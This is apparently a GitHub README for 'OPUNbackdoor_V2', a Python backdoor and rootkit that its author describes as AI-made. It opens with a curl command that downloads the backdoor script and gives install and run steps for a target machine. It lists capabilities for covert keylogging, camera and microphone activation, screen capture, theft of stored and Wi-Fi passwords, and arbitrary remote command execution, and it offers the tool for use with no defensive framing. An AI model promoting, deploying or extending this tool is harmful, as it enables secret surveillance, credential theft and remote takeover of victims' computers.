run: curl -O https://raw.githubusercontent.com/OPUNstopped/OPUNbackdoor_V2/main/BackdoorV2.py

# OPUNbackdoor_V2
A Backdoor that has not been polished before (made by AI)
# OPUNbackdoor_V2

## Overview

`OPUNbackdoor_V2` is an advanced rootkit that provides a wide range of remote control and monitoring capabilities. It allows you to control a target machine remotely, capture various types of data, and perform system manipulations.

## Features

- **Camera and Microphone Control**: Turn on/off the camera and microphone.
- **Keylogging**: Start/stop keylogging and retrieve logged data.
- **Screen Capture**: Capture and retrieve screenshots.
- **File System Manipulation**: List files, read, and write to files.
- **Process Management**: List processes, kill processes by PID.
- **Network Scanning**: Scan for open ports on a specified IP range.
- **Command Execution**: Execute arbitrary commands on the target machine.
- **System Information**: Retrieve system information, network interfaces, active connections, route table, and DNS cache.
- **Password Fetching**: Retrieve stored passwords and Wi-Fi passwords.
- **System Manipulation**: Reboot the computer, freeze the screen, and play a Rick Roll video.
- **Audio Recording**: Record audio for a specified duration.
- **Mouse Control**: Move and click the mouse.
- **Software and Recent Files**: List installed software and recent files.
- **Startup Items and Scheduled Tasks**: List startup items and scheduled tasks.
- **User Accounts and System Events**: List user accounts and retrieve system events.

## Requirements

Make sure you have the following dependencies installed:

```txt
pyaudio
opencv-python
pygetwindow
pynput
Pillow
psutil
netifaces
platform
pyautogui
webbrowser
requests
You can install these dependencies using pip:

sh
pip3 install -r requirements.txt
Installation
To install the OPUNbackdoor_V2 package from this repository, use the following command:

sh
pip3 install git+https://github.com/OPUNstopped/OPUNbackdoor_V2.git
Usage
Running the Rootkit
Start the Server: Run the rootkit on the target machine.

sh
python3 BackdoorV2.py
Connect to the Rootkit: Use the ControlBackdoor.py script to connect to the rootkit and send commands.

sh
python3 ControlBackdoor.py
Available Commands
The rootkit supports the following commands:

Turn on camera
Turn off camera
Turn on mic
Turn off mic
Start keylogger
Stop keylogger
Show keylogger results
Capture screen
List files in directory
Read file
Write to file
List processes
Kill process by PID
Scan network for open ports
Execute command
Get system information
Get network interfaces
Get active connections
Get route table
Get DNS cache
Fetch computer passwords
Reboot computer
Freeze screen
Rick Roll
Record audio
Move mouse
Click mouse
Get Wi-Fi passwords
Get installed software
Get recent files
Get startup items
Get scheduled tasks
Get user accounts
Get system events
Fetch content from a URL
